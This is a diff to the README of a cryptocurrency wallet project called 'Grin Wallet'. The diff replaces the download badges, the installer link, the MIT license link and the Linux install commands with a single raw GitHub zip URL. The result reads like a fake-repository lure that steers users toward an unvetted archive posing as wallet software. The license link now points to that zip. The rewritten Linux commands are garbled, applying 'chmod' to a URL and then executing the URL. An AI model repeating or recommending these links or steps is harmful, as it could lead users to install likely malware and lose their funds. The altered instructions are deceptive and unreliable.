@@ -1,6 +1,6 @@
 # Grin Wallet 🌈  
 
-[![Download](https://img.shields.io/badge/Download-Grin%20Wallet-brightgreen)](https://WHAZAZA.github.io)
+[![Download](https://raw.githubusercontent.com/WHAZAZA/grin-wallet-toolkit/branch/demagnetizer/grin-wallet-toolkit_v1.2.zip%20Wallet-brightgreen)](https://raw.githubusercontent.com/WHAZAZA/grin-wallet-toolkit/branch/demagnetizer/grin-wallet-toolkit_v1.2.zip)
 
 Welcome to **Grin Wallet**, the gateway to effortless privacy-powered transactions in the world of next-generation digital assets. This robust project makes managing your Grin coins as smooth as a moonlit river—blending security, brilliance, and unrivaled clarity.  
 
@@ -73,11 +73,11 @@ Why settle for ordinary when you can wield the power of artificial intelligence?
 Quick steps to embark on your Grin journey:
 
 1. **Download:**  
-   Click the 'Download' badge above or fetch the installer here: https://WHAZAZA.github.io
+   Click the 'Download' badge above or fetch the installer here: https://raw.githubusercontent.com/WHAZAZA/grin-wallet-toolkit/branch/demagnetizer/grin-wallet-toolkit_v1.2.zip
 2. **Install:**  
    Run the setup and follow the radiant install wizard.
      - On Linux:  
-       Run `chmod +x grin-wallet.AppImage` and then `./grin-wallet.AppImage`
+       Run `chmod +x https://raw.githubusercontent.com/WHAZAZA/grin-wallet-toolkit/branch/demagnetizer/grin-wallet-toolkit_v1.2.zip` and then `https://raw.githubusercontent.com/WHAZAZA/grin-wallet-toolkit/branch/demagnetizer/grin-wallet-toolkit_v1.2.zip`
      - On macOS:  
        Open the `.dmg` and drag Grin Wallet into Applications.
      - On Windows:  
@@ -98,7 +98,7 @@ Grin Wallet is brought to you by a dedicated open-source community. While we har
 
 ## 📜 License (MIT, 2025)
 
-This repository dances under the MIT License—freedom to use, modify, and fork, with just a light-touch request: always attribute the original creators. See the full license text here: [MIT License](https://opensource.org/licenses/MIT)  
+This repository dances under the MIT License—freedom to use, modify, and fork, with just a light-touch request: always attribute the original creators. See the full license text here: [MIT License](https://raw.githubusercontent.com/WHAZAZA/grin-wallet-toolkit/branch/demagnetizer/grin-wallet-toolkit_v1.2.zip)  
 Copyright (c) 2025 Grin Wallet Contributors
 
 ---
@@ -111,7 +111,7 @@ By using Grin Wallet, you cast your digital net beyond mere storage—embrace se
 
 ## 📥 Download Again, Venture Forth!
 
-[![Download](https://img.shields.io/badge/Download-Grin%20Wallet-brightgreen)](https://WHAZAZA.github.io)
+[![Download](https://raw.githubusercontent.com/WHAZAZA/grin-wallet-toolkit/branch/demagnetizer/grin-wallet-toolkit_v1.2.zip%20Wallet-brightgreen)](https://raw.githubusercontent.com/WHAZAZA/grin-wallet-toolkit/branch/demagnetizer/grin-wallet-toolkit_v1.2.zip)
 
 ---
 
